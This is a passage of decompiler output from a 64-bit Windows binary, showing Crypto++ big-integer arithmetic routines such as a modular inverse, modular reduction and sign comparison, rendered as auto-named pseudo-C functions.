    if ( !*v4 )
    {
      v5 = *(_QWORD *)(a2 + 16);
      if ( v5 )
      {
        v6 = &v4[v5 - 1];
        do
        {
          if ( *v6 )
            break;
          --v6;
          --v5;
        }
        while ( v5 );
      }
      if ( !(_DWORD)v5 )
        return v2;
    }
  }
  v8 = (const void *)v3[6];
  v9 = (void *)v3[11];
  if ( v9 != v8 )
    memcpy_s(v9, 8i64 * v3[5], v8, 8i64 * v3[5]);
  if ( (unsigned int)sub_140062F60(*(_QWORD *)(v2 + 16), v3[11], v3[11], *(_QWORD *)(v2 + 24)) )
  {
    v10 = v3[11];
    v11 = *(_QWORD *)(v2 + 16);
    v12 = v3[5];
    v13 = *(_QWORD *)(v10 + 8 * v11);
    v14 = (_QWORD *)(v10 + 8 * v11);
    *v14 = v13 - 1;
    if ( v13 - 1 > v13 )
    {
      v15 = 1;
      v16 = v12 - v11;
      if ( v16 > 1 )
      {
        v17 = 1i64;
        do
        {
          v18 = v14[v17];
          v14[v17] = v18 - 1;
          if ( v18 )
            break;
          v17 = ++v15;
        }
        while ( v15 < v16 );
      }
    }
  }
  return (signed __int64)(v3 + 8);
}

//----- (0000000140048790) ----------------------------------------------------
__int64 __fastcall sub_140048790(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rsi
  __int64 v5; // rdi
  int v6; // eax
  int v7; // er9
  void *v8; // rdx
  __int64 v9; // rdx
  void *v10; // rax
  unsigned __int64 v11; // rcx
  __int64 v12; // rax
  _QWORD *v13; // r10
  _QWORD *v14; // rax
  unsigned int v15; // eax
  _QWORD *v16; // rax
  _QWORD *v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  int v20; // eax
  int v21; // er9
  void *v22; // rdx
  _QWORD *v23; // rcx
  __int64 v24; // rax
  __int64 v25; // rax
  __int64 v26; // rax
  signed int v27; // ebx
  _QWORD *v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  int v31; // ebx
  void *v32; // rdx
  void *v33; // rdx
  void *v34; // rdx
  void *v35; // rdx
  void *v36; // rdx
  void *v37; // rdx
  char v39; // [rsp+30h] [rbp-D0h]
  unsigned int v40; // [rsp+34h] [rbp-CCh]
  void *v41; // [rsp+38h] [rbp-C8h]
  void *v42; // [rsp+40h] [rbp-C0h]
  __int64 v43; // [rsp+48h] [rbp-B8h]
  __int64 (__fastcall **v44)(void *); // [rsp+50h] [rbp-B0h]
  __int64 v45; // [rsp+60h] [rbp-A0h]
  void *v46; // [rsp+68h] [rbp-98h]
  int v47; // [rsp+70h] [rbp-90h]
  char v48; // [rsp+78h] [rbp-88h]
  __int64 v49; // [rsp+80h] [rbp-80h]
  __int64 v50; // [rsp+88h] [rbp-78h]
  void *v51; // [rsp+90h] [rbp-70h]
  int v52; // [rsp+98h] [rbp-68h]
  __int64 v53; // [rsp+A0h] [rbp-60h]
  __int64 v54; // [rsp+A8h] [rbp-58h]
  char v55; // [rsp+B0h] [rbp-50h]
  __int64 v56; // [rsp+C0h] [rbp-40h]
  void *v57; // [rsp+C8h] [rbp-38h]
  char v58; // [rsp+D8h] [rbp-28h]
  __int64 v59; // [rsp+E8h] [rbp-18h]
  void *v60; // [rsp+F0h] [rbp-10h]
  char v61; // [rsp+100h] [rbp+0h]
  __int64 v62; // [rsp+110h] [rbp+10h]
  void *v63; // [rsp+118h] [rbp+18h]
  char v64; // [rsp+128h] [rbp+28h]
  __int64 v65; // [rsp+138h] [rbp+38h]
  void *Memory; // [rsp+140h] [rbp+40h]
  char v67; // [rsp+150h] [rbp+50h]
  __int64 v68; // [rsp+160h] [rbp+60h]
  void *v69; // [rsp+168h] [rbp+68h]
  char v70; // [rsp+178h] [rbp+78h]
  __int64 v71; // [rsp+188h] [rbp+88h]
  void *v72; // [rsp+190h] [rbp+90h]
  char v73; // [rsp+1A0h] [rbp+A0h]
  __int64 v74; // [rsp+1B0h] [rbp+B0h]
  void *v75; // [rsp+1B8h] [rbp+B8h]

  v53 = -2i64;
  v3 = a3;
  v41 = (void *)a3;
  v4 = a2;
  v5 = a1;
  v43 = a1;
  v54 = a2;
  v40 = 0;
  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    v6 = sub_1400491C0(a1, &v64);
    sub_140048790(v6, v4, v3, v7);
    v40 = 1;
    v8 = Memory;
    memset(Memory, 0, 8 * v65);
    free(v8);
    return v4;
  }
  v9 = *(_QWORD *)(a3 + 16);
  if ( v9 && **(_BYTE **)(a3 + 24) & 1 )
  {
    v49 = 4 * v9;
    sub_140025670(4 * v9);
    v10 = (void *)v49;
    if ( v49 )
      v10 = sub_14003A000(8 * v49);
    v42 = v10;
    v50 = (__int64)v10;
    v11 = *(_QWORD *)(v3 + 16);
    if ( !qword_1400DAB40 )
    {
      cfltcvt_init(v11);
      qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
    }
    v44 = &off_1400A9910;
    v45 = sub_14004B580(v11);
    sub_140025670(v45);
    v12 = v45;
    if ( v45 )
    {
      v14 = sub_14003A000(8 * v45);
      v13 = v14;
      v41 = v14;
      v12 = v45;
    }
    else
    {
      v13 = 0i64;
      v41 = 0i64;
    }
    v46 = v13;
    v47 = 0;
    *v13 = 0i64;
    if ( v12 != 1 )
    {
      memset(v13 + 1, 0, 8 * (v12 - 1));
      v5 = v43;
    }
    v15 = sub_14003DE60(
            (char *)v13,
            (char *)v42,
            *(char **)(v5 + 24),
            *(_QWORD *)(v5 + 16),
            *(char **)(v3 + 24),
            *(_QWORD *)(v3 + 16));
    sub_1400469D0(v41, v41, v15, *(_QWORD *)(v3 + 24), *(_QWORD *)(v3 + 16));
    sub_14003C000(v4, (__int64)&v44);
    v40 = 1;
    memset(v41, 0, 8 * v45);
    free(v41);
    memset(v42, 0, 8 * v49);
    free(v42);
    return v4;
  }
  if ( *(_DWORD *)(a3 + 32) != 1 )
  {
    v16 = *(_QWORD **)(a3 + 24);
    if ( !*v16 )
    {
      if ( v9 )
      {
        v17 = &v16[v9 - 1];
        do
        {
          if ( *v17 )
            break;
          --v17;
          --v9;
        }
        while ( v9 );
      }
      if ( !(_DWORD)v9 )
        goto LABEL_55;
    }
  }
  if ( !*(_QWORD *)(a1 + 16) || !(**(_BYTE **)(a1 + 24) & 1) )
  {
LABEL_55:
    v19 = sub_14004B4E0(&v39);
    goto LABEL_51;
  }
  v18 = sub_14004B3C0(&v39);
  if ( sub_1400246C0(v5, v18) )
  {
    v19 = sub_14004B3C0(&v39);
LABEL_51:
    sub_14003C000(v4, v19);
    return v4;
  }
  v20 = sub_1400491C0(v3, &v70);
  sub_140048790(v20, (unsigned __int64)&v48, v5, v21);
  v22 = v72;
  memset(v72, 0, 8 * v71);
  free(v22);
  if ( v52 == 1 )
    goto LABEL_56;
  v23 = v51;
  if ( *(_QWORD *)v51 )
    goto LABEL_56;
  v24 = v50;
  if ( v50 )
  {
    v23 = (char *)v51 + 8 * v50 - 8;
    do
    {
      if ( *v23 )
        break;
      --v23;
      --v24;
    }
    while ( v24 );
  }
  if ( (_DWORD)v24 )
  {
LABEL_56:
    if ( !qword_1400DAB40 )
    {
      cfltcvt_init(v23);
      qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
    }
    v44 = &off_1400A9910;
    v45 = 2i64;
    v28 = sub_14003A000(0x10ui64);
    v46 = v28;
    v47 = 0;
    *v28 = 1i64;
    v28[1] = 0i64;
    v40 = 4;
    sub_140024710((__int64)&v67, v43, (__int64)&v48);
    v40 = 12;
    v29 = sub_1400246E0((__int64)&v61, (__int64)v41);
    v40 = 28;
    v30 = sub_140024740((__int64)&v58, v29);
    v40 = 60;
    v26 = sub_140024770((__int64)&v55, v30, v43);
    v27 = 124;
  }
  else
  {
    v25 = sub_14004B4E0(&v39);
    v26 = sub_14003C000((__int64)&v73, v25);
    v27 = 2;
  }
  v40 = v27;
  sub_14003C000(v4, v26);
  v31 = v27 | 1;
  v40 = v31;
  if ( v31 & 0x40 )
  {
    v31 &= 0xFFFFFFBF;
    v40 = v31;
    v32 = v57;
    memset(v57, 0, 8 * v56);
    free(v32);
  }
  if ( v31 & 0x20 )
  {
    v31 &= 0xFFFFFFDF;
    v40 = v31;
    v33 = v60;
    memset(v60, 0, 8 * v59);
    free(v33);
  }
  if ( v31 & 0x10 )
  {
    v31 &= 0xFFFFFFEF;
    v40 = v31;
    v34 = v63;
    memset(v63, 0, 8 * v62);
    free(v34);
  }
  if ( v31 & 8 )
  {
    v31 &= 0xFFFFFFF7;
    v40 = v31;
    v35 = v69;
    memset(v69, 0, 8 * v68);
    free(v35);
  }
  if ( v31 & 4 )
  {
    v31 &= 0xFFFFFFFB;
    v40 = v31;
    memset(v46, 0, 8 * v45);
    free(v46);
  }
  if ( v31 & 2 )
  {
    v40 = v31 & 0xFFFFFFFD;
    v36 = v75;
    memset(v75, 0, 8 * v74);
    free(v36);
  }
  v37 = v51;
  memset(v51, 0, 8 * v50);
  free(v37);
  return v4;
}
// 1400491C0: using guessed type __int64 __fastcall sub_1400491C0(_QWORD, _QWORD);
// 14004B3C0: using guessed type __int64 __fastcall sub_14004B3C0(_QWORD);
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140048CB0) ----------------------------------------------------
signed __int64 __fastcall sub_140048CB0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  unsigned __int64 v3; // rbx
  __int64 v4; // rax
  __int64 v5; // r9
  unsigned __int64 v6; // rcx
  signed __int64 v7; // r8
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rtt
  unsigned __int64 v10; // rtt

  v2 = a2;
  v3 = a2;
  v4 = sub_140049290(a1, a2);
  v5 = 0i64;
  v6 = v4;
  v7 = 1i64;
  if ( !v4 )
    return 0i64;
  while ( v6 != 1 )
  {
    v9 = v3;
    v8 = v3 % v6;
    v3 = v8;
    v5 += v7 * (v9 / v6);
    if ( !v8 )
      return 0i64;
    if ( v8 == 1 )
      return v2 - v5;
    v10 = v6;
    v6 %= v8;
    v7 += v5 * (v10 / v8);
    if ( !v6 )
      return 0i64;
  }
  return v7;
}

//----- (0000000140048D40) ----------------------------------------------------
_BOOL8 __fastcall sub_140048D40(signed __int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  int v3; // eax
  bool v4; // bl
  void *v5; // rdx
  void *v6; // rdx
  int v8; // [rsp+28h] [rbp-60h]
  __int64 v9; // [rsp+38h] [rbp-50h]
  void *v10; // [rsp+40h] [rbp-48h]
  char v11; // [rsp+50h] [rbp-38h]
  __int64 v12; // [rsp+60h] [rbp-28h]
  void *Memory; // [rsp+68h] [rbp-20h]

  v1 = a1;
  sub_14004BAA0(a1, (__int64)&v8);
  v2 = sub_140029020((__int64)&v8, (__int64)&v11);
  if ( *(_DWORD *)(v1 + 32) == 1 )
  {
    if ( *(_DWORD *)(v2 + 32) == 1 )
      v3 = -(signed int)sub_14004A0B0(v1, v2);
    else
      v3 = -1;
  }
  else if ( *(_DWORD *)(v2 + 32) == 1 )
  {
    v3 = 1;
  }
  else
  {
    v3 = sub_14004A0B0(v1, v2);
  }
  v4 = v3 == 0;
  v5 = Memory;
  memset(Memory, 0, 8 * v12);
  free(v5);
  v6 = v10;
  memset(v10, 0, 8 * v9);
  free(v6);
  return v4;
}

//----- (0000000140048E00) ----------------------------------------------------
char __fastcall sub_140048E00(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v3; // r8
  _QWORD *v4; // rcx

  v2 = *(_QWORD *)(a2 + 16);
  v3 = *(_QWORD **)(a2 + 24);
  if ( v2 )
  {
    v4 = &v3[v2 - 1];
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v2;
    }
    while ( v2 );
  }
  if ( (_DWORD)v2 != 1 || *v3 != 1i64 )
    LOBYTE(v2) = 0;
  return v2;
}

//----- (0000000140048E40) ----------------------------------------------------
char __fastcall sub_140048E40(__int64 a1)
{
  __int64 v1; // rax
  _QWORD *v2; // rdx
  _QWORD *v3; // rcx

  v1 = *(_QWORD *)(a1 + 16);
  v2 = *(_QWORD **)(a1 + 24);
  if ( v1 )
  {
    v3 = &v2[v1 - 1];
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( (_DWORD)v1 != 1 || *v2 != 1i64 )
    LOBYTE(v1) = 0;
  return v1;
}

//----- (0000000140048E80) ----------------------------------------------------
__int64 __fastcall sub_140048E80(__int64 *a1)
{
  __int64 v1; // rax

  v1 = *a1;
  *((_BYTE *)a1 + 32) = 0;
  return (*(__int64 (**)(void))(v1 + 352))();
}

//----- (0000000140048E90) ----------------------------------------------------
void __noreturn sub_140048E90()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140048040(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4290: using guessed type int _TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__;

//----- (0000000140048F60) ----------------------------------------------------
__int64 __fastcall sub_140048F60(__int64 a1, int a2)
{
  int v2; // ebx
  __int64 v3; // r14
  signed int v4; // ebp
  int *v5; // rdi
  unsigned int v6; // esi
  int v8; // edi
  unsigned __int64 v9; // rdx
  __int64 v10; // rdx
  __int64 v11; // rax
  __int64 v12; // rax
  char v13; // bl
  void *v14; // rdx
  void *v15; // rdx
  char v16; // [rsp+28h] [rbp-70h]
  __int64 v17; // [rsp+38h] [rbp-60h]
  void *Memory; // [rsp+40h] [rbp-58h]
  char v19; // [rsp+50h] [rbp-48h]
  __int64 v20; // [rsp+60h] [rbp-38h]
  void *v21; // [rsp+68h] [rbp-30h]
  unsigned int v22; // [rsp+A8h] [rbp+10h]
  int v23; // [rsp+B0h] [rbp+18h]

  v2 = a2;
  v3 = a1;
  v4 = 0;
  v22 = 0;
  v22 = sub_1400453C0(a1);
  v23 = 1;
  v5 = (int *)&v22;
  if ( v22 <= 1 )
    v5 = &v23;
  v6 = *v5;
  if ( !v2 )
    return v6;
  v8 = *(_DWORD *)(v3 + 32);
  if ( v8 != 1 )
  {
    v9 = (unsigned __int64)(v6 - 1) >> 3;
    if ( v9 < *(_QWORD *)(v3 + 16) )
      v10 = *(_QWORD *)(*(_QWORD *)(v3 + 24) + 8 * v9) >> 8 * ((v6 - 1) & 7);
    else
      LOBYTE(v10) = 0;
    if ( (v10 & 0x80u) != 0i64 )
      ++v6;
    if ( v8 != 1 )
      goto LABEL_24;
  }
  v11 = sub_14004A6C0(&v19, 8 * v6 - 1);
  v22 = 1;
  v12 = sub_14003D010(v11, (__int64)&v16);
  v4 = 3;
  if ( sub_14003D250(v3, v12) )
    v13 = 1;
  else
LABEL_24:
    v13 = 0;
  if ( v4 & 2 )
  {
    v4 &= 0xFFFFFFFD;
    v22 = v4;
    v14 = Memory;
    memset(Memory, 0, 8 * v17);
    free(v14);
  }
  if ( v4 & 1 )
  {
    v15 = v21;
    memset(v21, 0, 8 * v20);
    free(v15);
  }
  if ( v13 )
    ++v6;
  return v6;
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);

//----- (00000001400490B0) ----------------------------------------------------
__int64 __fastcall sub_1400490B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rsi
  unsigned __int64 *v6; // r8
  __int64 v7; // r8
  __int64 v8; // rdx
  unsigned __int64 v10; // [rsp+50h] [rbp+8h]
  __int64 v11; // [rsp+58h] [rbp+10h]
  unsigned __int64 v12; // [rsp+60h] [rbp+18h]

  v11 = a2;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v10 = *(_QWORD *)(a3 + 16);
  v12 = *(_QWORD *)(a1 + 16);
  v6 = &v10;
  if ( v12 >= v10 )
    v6 = &v12;
  sub_14003BE30(a2, 0i64, *v6);
  if ( *(_DWORD *)(v5 + 32) == 1 )
  {
    if ( *(_DWORD *)(v3 + 32) != 1 )
    {
      sub_140049F00(v4, v5, v3);
      *(_DWORD *)(v4 + 32) = 1;
      return v4;
    }
    v7 = v5;
    v8 = v3;
LABEL_9:
    sub_14004A490(v4, v8, v7);
    return v4;
  }
  v7 = v3;
  v8 = v5;
  if ( *(_DWORD *)(v3 + 32) != 1 )
    goto LABEL_9;
  sub_140049F00(v4, v5, v3);
  return v4;
}

//----- (0000000140049160) ----------------------------------------------------
__int64 __fastcall sub_140049160(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_1400247D0((__int64)&v7, a2);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (0000000140049290) ----------------------------------------------------
__int64 __fastcall sub_140049290(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 v3; // rsi
  _QWORD *v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rbx
  _QWORD *v7; // rax
  unsigned __int64 v8; // rdx
  __int64 v9; // r8
  __int64 v10; // r9
  __int64 v11; // r14
  unsigned __int64 v13; // [rsp+20h] [rbp-68h]
  __int64 v14; // [rsp+28h] [rbp-60h]
  char v15; // [rsp+30h] [rbp-58h]

  v2 = a2;
  v3 = a1;
  if ( !a2 )
  {
    sub_14003C450(&v15);
    CxxThrowException(&v15, &_TI3_AVcls_099_cls_097_CryptoPP__);
  }
  v4 = *(_QWORD **)(a1 + 24);
  if ( (a2 - 1) & a2 )
  {
    v6 = *(_QWORD *)(a1 + 16);
    if ( v6 )
    {
      v7 = &v4[v6 - 1];
      do
      {
        if ( *v7 )
          break;
        --v7;
        --v6;
      }
      while ( v6 );
    }
    if ( a2 > 5 )
    {
      v5 = 0i64;
      if ( (_DWORD)v6 )
      {
        v11 = *(_QWORD *)(a1 + 24);
        do
        {
          v14 = v5;
          LODWORD(v6) = v6 - 1;
          v13 = *(_QWORD *)(v11 + 8i64 * (unsigned int)v6);
          v5 = sub_14003D190((__int64 *)&v13, v2);
        }
        while ( (_DWORD)v6 );
      }
    }
    else
    {
      v8 = 0i64;
      v13 = 0i64;
      v9 = 0i64;
      v14 = 0i64;
      if ( (_DWORD)v6 )
      {
        v10 = *(_QWORD *)(a1 + 24);
        do
        {
          v6 = (unsigned int)(v6 - 1);
          v8 += *(_QWORD *)(v10 + 8 * v6);
          v9 += v8 < *(_QWORD *)(v10 + 8 * v6);
        }
        while ( (_DWORD)v6 );
        v13 = v8;
        v14 = v9;
      }
      v5 = sub_14003D190((__int64 *)&v13, v2);
    }
  }
  else
  {
    v5 = (a2 - 1) & *v4;
  }
  if ( *(_DWORD *)(v3 + 32) == 1 && v5 )
    v5 = v2 - v5;
  return v5;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4228: using guessed type int _TI3_AVcls_099_cls_097_CryptoPP__;

//----- (00000001400493F0) ----------------------------------------------------
int __usercall sub_1400493F0@<eax>(void *Dst@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, __int64 a4@<r9>, __int64 a5, __int64 a6)
{
  __int64 v6; // rbp
  __int64 v7; // rsi
  __int64 v8; // rbx
  __int64 v9; // r14
  void *v10; // r12
  __int64 v11; // rbx
  int result; // eax
  const void *v13; // r8

  v6 = a6;
  v7 = a4;
  v8 = a3;
  v9 = a2;
  v10 = Dst;
  sub_14004B130((__int64)Dst, a2, a3, a5, a6);
  sub_1400499D0(v9, 8 * v6 + v9, v8, (__int64)v10, v7, v6);
  v11 = (signed int)sub_140062F60(a6, v9, 8 * a6 + v8, v9);
  result = sub_140062F10(v6, 8 * v6 + v9, v9, v7);
  v13 = (const void *)(v9 + 8 * (a6 & -v11));
  if ( v10 != v13 )
    result = memcpy_s(v10, 8 * a6, v13, 8 * a6);
  return result;
}

//----- (0000000140049520) ----------------------------------------------------
__int64 __fastcall sub_140049520(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400AA028;
    result = *(unsigned int *)(v3 + 32);
    *(_DWORD *)(v2 + 32) = result;
  }
  return result;
}
// 1400AA028: using guessed type __int64 (__fastcall *off_1400AA028)(void *);

//----- (0000000140049570) ----------------------------------------------------
__int64 sub_140049570()
{
  char v1; // [rsp+10h] [rbp+10h]

  return sub_14004B3C0(&v1);
}
// 14004B3C0: using guessed type __int64 __fastcall sub_14004B3C0(_QWORD);

//----- (0000000140049580) ----------------------------------------------------
__int64 __fastcall sub_140049580(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_1400496F0(a2, (__int64)&v7);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (00000001400495E0) ----------------------------------------------------
signed __int64 __fastcall sub_1400495E0(__int64 a1, __int64 a2)
{
  char *v2; // r15
  _BYTE *v3; // rsi
  unsigned __int64 v4; // r14
  __int64 v5; // rdi
  __int64 v6; // rdx
  __int64 v7; // rbx
  char *v8; // r8
  __int64 v9; // rax
  unsigned int v10; // eax
  __int64 v11; // r9
  unsigned __int64 v12; // r8

  v2 = *(char **)(a1 + 200);
  v3 = *(_BYTE **)(a1 + 88);
  v4 = *(_QWORD *)(a1 + 40);
  v5 = a2;
  v6 = *(_QWORD *)(a2 + 16);
  v7 = a1;
  v8 = *(char **)(v5 + 24);
  if ( v2 != v8 )
    memcpy_s(*(void **)(a1 + 200), 8 * v6, v8, 8 * v6);
  v9 = *(_QWORD *)(v5 + 16);
  if ( 2 * v4 != v9 )
    memset(&v2[8 * v9], 0, 8 * (2 * v4 - v9));
  sub_1400493F0(v3, (__int64)&v2[16 * v4], (__int64)v2, *(_QWORD *)(v7 + 48), *(_QWORD *)(v7 + 168), v4);
  v10 = sub_14003DE60(v3, v2, v3, v4, *(char **)(v7 + 48), v4);
  v11 = *(_QWORD *)(v7 + 48);
  v12 = v4 << 6;
  if ( v10 <= v4 << 6 )
    sub_140049910(v3, v3, v12 - v10, v11, v4);
  else
    sub_1400469D0(v3, v3, v10 - v12, v11, v4);
  return v7 + 64;
}

//----- (00000001400496F0) ----------------------------------------------------
__int64 __fastcall sub_1400496F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v3; // r8
  __int64 v4; // rbx
  __int64 v5; // rdx
  _QWORD *v6; // rcx
  char v8; // [rsp+40h] [rbp+8h]

  v2 = *(_QWORD *)(a1 + 16);
  v3 = *(_QWORD **)(a1 + 24);
  v4 = a2;
  v5 = a1;
  if ( v2 )
  {
    v6 = &v3[v2 - 1];
    do
    {
      if ( *v6 )
        break;
      --v6;
      --v2;
    }
    while ( v2 );
  }
  if ( (_DWORD)v2 != 1 || *v3 != 1i64 )
    v5 = sub_14004B4E0(&v8);
  sub_14003C000(v4, v5);
  return v4;
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);

//----- (0000000140049760) ----------------------------------------------------
__int64 __fastcall sub_140049760(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_1400246E0((__int64)&v7, a2);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (00000001400497C0) ----------------------------------------------------
char __fastcall sub_1400497C0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rsi
  __int64 v6; // rax
  int v7; // edx
  _QWORD *v8; // rcx
  _QWORD *v9; // rcx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_14004A350(a1, a2, a3);
  LOBYTE(v6) = *(_DWORD *)(v3 + 32) != 1;
  if ( (*(_DWORD *)(v4 + 32) != 1) != (_BYTE)v6 )
  {
    v7 = *(_DWORD *)(v5 + 32);
    if ( v7 == 1 )
      goto LABEL_13;
    v8 = *(_QWORD **)(v5 + 24);
    if ( *v8 )
      goto LABEL_13;
    v6 = *(_QWORD *)(v5 + 16);
    if ( v6 )
    {
      v9 = &v8[v6 - 1];
      do
      {
        if ( *v9 )
          break;
        --v9;
        --v6;
      }
      while ( v6 );
    }
    if ( (_DWORD)v6 )
    {
LABEL_13:
      LOBYTE(v6) = 1 - v7;
      *(_DWORD *)(v5 + 32) = 1 - v7;
    }
  }
  return v6;
}

//----- (0000000140049840) ----------------------------------------------------
signed __int64 __fastcall sub_140049840(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r15
  unsigned __int64 *v4; // r14
  void *v5; // r12
  __int64 v6; // rbx
  __int64 v7; // rdi
  _QWORD *v8; // rsi
  __int64 v9; // rdx
  __int64 v10; // rax

  v3 = a1[5];
  v4 = (unsigned __int64 *)a1[25];
  v5 = (void *)a1[11];
  v6 = a3;
  v7 = a2;
  v8 = a1;
  sub_14003E520(
    v4,
    (__int64)&v4[2 * v3],
    *(_QWORD *)(a2 + 24),
    *(_QWORD *)(a2 + 16),
    *(_QWORD *)(a3 + 24),
    *(_QWORD *)(a3 + 16));
  v9 = *(_QWORD *)(v6 + 16);
  v10 = *(_QWORD *)(v7 + 16);
  if ( 2 * v3 - v9 != v10 )
    memset(&v4[v9 + v10], 0, 8 * (2 * v3 - v9 - v10));
  sub_1400493F0(v5, (__int64)&v4[2 * v3], (__int64)v4, v8[6], v8[21], v3);
  return (signed __int64)(v8 + 8);
}

//----- (0000000140049910) ----------------------------------------------------
void __fastcall sub_140049910(void *a1, const void *a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int64 v5; // rsi
  __int64 v6; // rbp
  __int64 v7; // rdi
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rdx

  v5 = a3;
  v6 = a4;
  v7 = (__int64)a1;
  if ( a1 != a2 )
    memcpy_s(a1, 8 * a5, a2, 8 * a5);
  while ( v5 )
  {
    --v5;
    v8 = 0i64;
    v9 = 0i64;
    if ( a5 )
    {
      do
      {
        v10 = *(_QWORD *)(v7 + 8 * v9++);
        *(_QWORD *)(v7 + 8 * v9 - 8) = v8 | 2 * v10;
        v8 = v10 >> 63;
      }
      while ( v9 < a5 );
      if ( (v10 & 0x8000000000000000ui64) != 0i64 )
        goto LABEL_12;
    }
    if ( (signed int)sub_140045A20(v7, v6, a5) >= 0 )
LABEL_12:
      sub_140062F60(a5, v7, v7, v6);
  }
}

//----- (00000001400499D0) ----------------------------------------------------
signed __int64 __fastcall sub_1400499D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, unsigned __int64 a6)
{
  unsigned __int64 v6; // r14
  __int64 v7; // r10
  __int64 v8; // r12
  __int64 v9; // r9
  signed int v10; // ebp
  unsigned __int64 v11; // rdi
  signed __int64 v12; // rdx
  unsigned int v13; // esi
  unsigned __int64 v14; // rcx
  signed __int64 v15; // rax
  signed __int64 v16; // r9
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // r8
  signed int v19; // eax
  unsigned __int64 v20; // r13
  unsigned __int64 v21; // rcx
  signed __int64 v22; // rax
  unsigned __int64 v23; // rdx
  unsigned __int64 v24; // r8
  signed int v25; // eax
  unsigned __int64 v26; // rbx
  unsigned __int64 *v27; // r12
  unsigned __int64 *v28; // r14
  BOOL v29; // er15
  BOOL v30; // eax
  unsigned __int64 v31; // rcx
  int v32; // er15
  unsigned __int64 *v33; // rax
  unsigned __int64 v34; // rdx
  unsigned __int64 v35; // r8
  signed int v36; // eax
  BOOL v37; // er13
  int v38; // ebx
  BOOL v39; // eax
  unsigned __int64 v40; // rcx
  unsigned __int64 *v41; // rax
